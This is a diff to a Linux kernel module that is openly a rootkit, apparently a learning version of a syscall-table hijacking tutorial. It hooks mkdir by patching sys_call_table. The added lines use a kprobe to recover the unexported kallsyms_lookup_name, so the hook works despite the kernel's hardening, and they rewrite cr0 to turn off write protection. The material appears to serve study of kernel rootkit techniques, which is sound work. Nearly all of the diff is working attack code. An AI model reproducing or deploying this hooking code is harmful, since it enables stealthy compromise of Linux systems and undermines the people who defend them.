@@ -1,18 +1,16 @@
-#include <linux/init.h>
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/syscalls.h>
-#include <linux/kallsyms.h>
-#include <linux/namei.h>
-
 #include "rootest.h"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("TheXcellerator");
-MODULE_DESCRIPTION("Syscall Table Hijacking");
+MODULE_AUTHOR("JB Poquelin");
+MODULE_DESCRIPTION("HOOKING SYSCALL TABLE");
 MODULE_VERSION("0.01");
 
 unsigned long * __sys_call_table;
+
+/* pour régler de le kallsyms_lookup_name pas défini (déactivé par sécurité) */
+struct kprobe kp_kln = {
+    .symbol_name = "kallsyms_lookup_name"
+};
 
 /* Despite what's written in include/linux/syscalls.h,
  * we have to declare the original syscall as taking
@@ -62,9 +60,9 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
 /* The built in linux write_cr0() function stops us from modifying
  * the WP bit, so we write our own instead */
 inline void cr0_write(unsigned long cr0)
-{
-    //asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
-    asm volatile("mov %0,%%cr0" : "+r"(cr0) : __FORCE_ORDER);
+{	
+    unsigned long __force_order;
+    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
 }
 
 /* Bit 16 in the cr0 register is the W(rite) P(rotection) bit which
@@ -87,15 +85,21 @@ inline void unprotect_memory(void)
 /* Module initialization function */
 int __init rootkit_init_hook(void)
 {
+    /* pour régler de le kallsyms_lookup_name pas défini (déactivé par sécurité) */
+    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+    register_kprobe(&kp_kln);
+    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp_kln.addr;
+    unregister_kprobe(&kp_kln);
     /* Grab the syscall table, and make sure we succeeded */
-    __sys_call_table = kallsyms_lookup_name("sys_call_table");
+    __sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 
     /* Grab the function pointer to the real sys_mkdir syscall */
     orig_mkdir = (orig_mkdir_t)__sys_call_table[__NR_mkdir];
 
     printk(KERN_INFO "rootkit: Loaded >:-)\n");
-    printk(KERN_DEBUG "rootkit: Found the syscall table at 0x%lx\n", __sys_call_table);
-    printk(KERN_DEBUG "rootkit: mkdir @ 0x%lx\n", orig_mkdir);
+    printk(KERN_INFO "rootkit: Found the syscall table at 0x%lx\n", __sys_call_table);
+    printk(KERN_INFO "rootkit: mkdir @ 0x%lx\n", orig_mkdir);
     
     unprotect_memory();
 
@@ -119,6 +123,3 @@ void __exit rootkit_exit_hook(void)
     
     printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
-
-//module_init(rootkit_init_hook);
-//module_exit(rootkit_exit_hook);
